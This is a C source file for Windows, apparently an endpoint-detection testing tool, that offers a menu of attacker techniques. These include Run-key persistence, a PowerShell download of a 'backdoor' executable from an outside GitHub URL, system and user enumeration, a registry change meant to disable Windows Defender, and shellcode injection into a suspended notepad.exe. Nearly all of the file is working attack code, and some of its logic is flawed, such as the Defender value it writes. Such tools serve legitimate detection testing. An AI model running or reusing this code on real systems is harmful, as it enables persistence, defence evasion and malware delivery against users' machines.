#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winreg.h>
#include <urlmon.h>
#include <lm.h>

//------------------EDR TESTING TOOL -------------------
//---------------------polgs----------------------------
#define COMMAND_BOOT 1
#define COMMAND_FILE 2
#define COMMAND_DOWNLOAD 3
#define COMMAND_INFO 4
#define COMMAND_PROC 5
#define COMMAND_AV 6
#define COMMAND_HOLLOW 7

void print_commands() {
    printf("Possible commands:\n");
    printf("%d - Start on Boot(reg)\n", COMMAND_BOOT);
    printf("%d - File Creation\n", COMMAND_FILE);
    printf("%d - Download backdoor(ps)\n", COMMAND_DOWNLOAD);
    printf("%d - System Info(ps)\n", COMMAND_INFO);
    printf("%d - Create Proc\n", COMMAND_PROC);
    printf("%d - Disable Windows Defender(reg)\n", COMMAND_AV);
    printf("%d - Process Hollowing(mem)\n", COMMAND_HOLLOW);
}

int procHollow() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hProcess;
    LPVOID lpProcessAddress;
    DWORD dwProcessSize;
    DWORD dwThreadId;
    CONTEXT ctx;
    BOOL bResult;

    // Create suspended process
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    bResult = CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!bResult) {
        printf("Failed to create process\n");
        return 1;
    }
    
    // Allocate memory in process
    dwProcessSize = 1024;
    lpProcessAddress = VirtualAllocEx(pi.hProcess, NULL, dwProcessSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpProcessAddress == NULL) {
        printf("Failed to allocate memory in process\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    // Write payload to process memory
    char payload_2[] = "\x90\x90\x90\x90\x90";
    char payload[] ="\x31\xc0\x50\x68\x45\x78\x65\x20\x68\x57\x6f\x72\x6c\x8b\xcc\x8b\xd4\x50\xb8\x4d\x11\x86\x7c\xff\xd0";
    bResult = WriteProcessMemory(pi.hProcess, lpProcessAddress, payload, sizeof(payload), NULL);
    if (!bResult) {
        printf("Failed to write payload to process memory\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    // Modify thread context to point to payload
    ctx.ContextFlags = CONTEXT_FULL;
    bResult = GetThreadContext(pi.hThread, &ctx);
    if (!bResult) {
        printf("Failed to get thread context\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    ctx.Eip = (DWORD)lpProcessAddress;

    bResult = SetThreadContext(pi.hThread, &ctx);
    if (!bResult) {
        printf("Failed to set thread context\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    // Resume process
    bResult = ResumeThread(pi.hThread);
    if (bResult == -1) {
        printf("Failed to resume thread\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    printf("Process hollowing successful\n");
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}


int disableAV() {
    HKEY hKey;
    LONG regResult;
    DWORD dwType = REG_DWORD;
    DWORD dwSize = sizeof(DWORD);
    DWORD newValue = 0;
    DWORD oldValue = 0;
    regResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &hKey);
    if (regResult != ERROR_SUCCESS) {
        printf("Failed to open registry key: %d\n", regResult);
        return 1;
    }
    regResult = RegQueryValueEx(hKey, "DisableAntiSpyware", NULL, &dwType, (LPBYTE)&oldValue, &dwSize);
    if (regResult != ERROR_SUCCESS) {
        printf("Failed to read registry value: %d\n", regResult);
        RegCloseKey(hKey);
        return 1;
    }
    if (oldValue == newValue) {
        printf("Antivirus already disabled\n");
        RegCloseKey(hKey);
        return 0;
    }
    regResult = RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&newValue, dwSize);
    if (regResult != ERROR_SUCCESS) {
        printf("Failed to set registry value: %d\n", regResult);
        RegCloseKey(hKey);
        return 1;
    }
    printf("Antivirus disabled\n");
    RegCloseKey(hKey);
    return 0;
}



int set_startup_regkey(char* script_path) {
    HKEY hKey;
    LONG create_status = RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (create_status != ERROR_SUCCESS) {
        printf("Error creating registry key.\n");
        return create_status;
    }

    char* reg_value_name = "MyScript";
    char reg_value_data[MAX_PATH];
    snprintf(reg_value_data, MAX_PATH, "\"%s\"", script_path);

    LONG set_status = RegSetValueEx(hKey, reg_value_name, 0, REG_SZ, (BYTE*)reg_value_data, strlen(reg_value_data));
    if (set_status != ERROR_SUCCESS) {
        printf("Error setting registry key value.\n");
    }

    RegCloseKey(hKey);
    return set_status;
}

void createTextFile(const char* filename, const char* content) {
    FILE* file = fopen(filename, "w");
    if (file != NULL) {
        fprintf(file, "%s", content);
        fclose(file);
    } else {
        printf("Error creating file %s", filename);
    }
}


int downloadFile(const char* url, const char* filename) {
    char command[1024];
    sprintf(command, "powershell -Command (new-object System.Net.WebClient).DownloadFile('%s', '%s')", url, filename);
    return system(command);
}



int printUsersInfo() {
    char command[] = "powershell -command \"Get-WmiObject Win32_UserAccount | Select Name\"";
    char output[1024];
    FILE* fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to execute PowerShell command.\n");
        return 1;
    }
    while (fgets(output, sizeof(output), fp) != NULL) {
        printf("%s", output);
    }
    _pclose(fp);
    return 0;
}

int printOSInfo() {
    char command[] = "powershell -command \"Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,OSArchitecture\"";
    char output[1024];
    FILE* fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to execute PowerShell command.\n");
        return 1;
    }
    while (fgets(output, sizeof(output), fp) != NULL) {
        printf("%s", output);
    }
    _pclose(fp);
    return 0;
}

int printCPUInfo() {
    char command[] = "powershell -command \"Get-CimInstance Win32_Processor | Select-Object Name,NumberOfCores,NumberOfLogicalProcessors\"";
    char output[1024];
    FILE* fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to execute PowerShell command.\n");
        return 1;
    }
    while (fgets(output, sizeof(output), fp) != NULL) {
        printf("%s", output);
    }
    _pclose(fp);
    return 0;
}

int printMemoryInfo() {
    char command[] = "powershell -command \"Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object @{Name='MemoryInGB';Expression={$_.Sum / 1GB}}\"";
    char output[1024];
    FILE* fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to execute PowerShell command.\n");
        return 1;
    }
    while (fgets(output, sizeof(output), fp) != NULL) {
        printf("%s", output);
    }
    _pclose(fp);
    return 0;
}

int printNetworkInfo() {
    char command[] = "powershell -command \"Get-NetIPAddress | Where-Object {$_.InterfaceAlias -eq 'Ethernet' -or $_.InterfaceAlias -eq 'Wi-Fi'} | Select-Object IPAddress,InterfaceAlias\"";
    char output[1024];
    FILE* fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to execute PowerShell command.\n");
        return 1;
    }
    while (fgets(output, sizeof(output), fp) != NULL) {
        printf("%s", output);
    }
    _pclose(fp);
    return 0;
}

int printInfo(){
	printUsersInfo();
	printCPUInfo();
	printMemoryInfo();
	printOSInfo();
	printNetworkInfo();
}


int createProc() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcess(NULL, "calc.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%d)\n", GetLastError());
        return 1;
    }
    printf("Calc process started (PID: %d)\n", pi.dwProcessId);
    WaitForSingleObject(pi.hProcess, INFINITE);
    printf("Calc process exited\n");
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}




int main() {
    int command;
    char script_path[MAX_PATH];
    memset(script_path, 0, MAX_PATH);
    GetModuleFileName(NULL, script_path, MAX_PATH);
    char script_dir[MAX_PATH];
    strncpy(script_dir, script_path, strrchr(script_path, '\\') - script_path + 1);

    do {
        print_commands();
        printf("Enter command: ");
        scanf("%d", &command);

        switch (command) {
            case COMMAND_BOOT:
                if (set_startup_regkey(script_path) == ERROR_SUCCESS) {
                    printf("Registry key set successfully.\n");
                }
                break;

            case COMMAND_FILE:
	        createTextFile("example.txt", "This is an example text file.");
                break;

            case COMMAND_DOWNLOAD:
                downloadFile("https://github.com/PolGs/Persistent-Backdoor/releases/download/0.12/back.exe", "back.exe");
                break;
	    case COMMAND_INFO:
	    	printInfo();
	    	break;
	    case COMMAND_PROC:
	    	createProc();
	    	break;
	    case COMMAND_AV:
	    	disableAV();
	    	break;
	    case COMMAND_HOLLOW:
	    	procHollow();
	    	break;	
            default:
                printf("Invalid command.\n");
        }
    } while (1);

    return 0;
}
